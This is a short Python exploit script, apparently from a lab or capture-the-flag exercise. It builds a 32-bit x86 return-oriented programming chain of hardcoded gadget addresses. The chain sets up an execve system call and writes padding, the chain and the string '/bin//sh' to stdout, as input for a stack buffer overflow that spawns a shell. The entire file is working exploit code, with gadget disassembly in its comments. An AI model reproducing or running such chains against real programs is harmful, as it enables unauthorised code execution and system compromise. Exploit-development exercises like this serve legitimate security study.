#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack


p32 = lambda x: pack("<I", x)
chain = b''
chain += p32(0x080c9d41)
chain += p32(0x080c9d41)
chain += p32(0x080c9d41)
chain += p32(0x080c9d41) # Need these to work, but I don't know why

'''
   0x0805c393 <malloc+387>:     xor    %edx,%edx
   0x0805c395 <malloc+389>:     pop    %ebx
   0x0805c396 <malloc+390>:     mov    %edx,%eax
   0x0805c398 <malloc+392>:     pop    %esi
   0x0805c399 <malloc+393>:     pop    %edi
   0x0805c39a <malloc+394>:     ret
'''
chain += p32(0x0805c393)
chain += p32(0xbbbbbbbb)
chain += p32(0xbbbbbbbb)
chain += p32(0xbbbbbbbb) # edx=eax=0


'''
0x080620f1: xor eax, eax
0x080c9d41:
   0x080c9d41:  inc    %eax
   0x080c9d42:  ret
'''
chain += p32(0x080c9d41)
chain += p32(0x080c9d41)
chain += p32(0x080c9d41)
chain += p32(0x080c9d41)
chain += p32(0x080c9d41)
chain += p32(0x080c9d41)
chain += p32(0x080c9d41)
chain += p32(0x080c9d41)
chain += p32(0x080c9d41)
chain += p32(0x080c9d41)
chain += p32(0x080c9d41)


'''
0x08069f6b pop ebx
'''
path_addr = pack('<I',0xfffed77c-24)
chain+=p32(0x08069f6b)
chain+=path_addr # ebx loaded

'''
0x0806e241 : xor ecx, ecx ; int 0x80
'''
chain+=p32(0x0806e241)

shellcode=chain

pad = 24*4
shell_path = b'/bin//sh'

# sys.stdout.buffer.write(b'\"')
sys.stdout.buffer.write(b'\xaa'*(pad))
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'\xff'*16)
sys.stdout.buffer.write(shell_path)
# sys.stdout.buffer.write(b'\"')
